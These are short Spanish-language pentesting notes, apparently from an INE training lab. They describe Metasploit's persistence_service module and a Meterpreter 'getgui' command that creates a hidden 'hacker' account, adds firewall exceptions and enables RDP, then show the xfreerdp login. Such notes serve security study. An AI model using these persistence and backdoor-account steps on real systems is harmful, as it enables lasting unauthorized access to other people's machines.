
### Msfconsole exploit/windows/local/persistence_service
- modulo  genera un payload con msfvenom y envia al host, este crea un servicio que corre en background el cual dará acceso permanente para conectar con un handler. servicio se ejecuta cada x segundos configurado en el modulo, este por defecto son 5 segundos.
- Si se requere retomar el acceso, se debe usar el modulo multi/handler, apuntando al host y puerto establecido desde inicio. tienen q ser exactamente las mismas configuraciones que cuando se creo el primer paso

------
### En meterpreter crear usuario, necesita NT Authority/System
- genera un usuario, esconde de partes visiblesy genera de manera automatica excepciones de firewall y habilita servicio rdp
```
run getgui -e -u hacker -p password_123
```
luego es posible ingresar con rdp
```
xfreerdp /u:hacker /p:password_123 /v:demo.ine.local
```

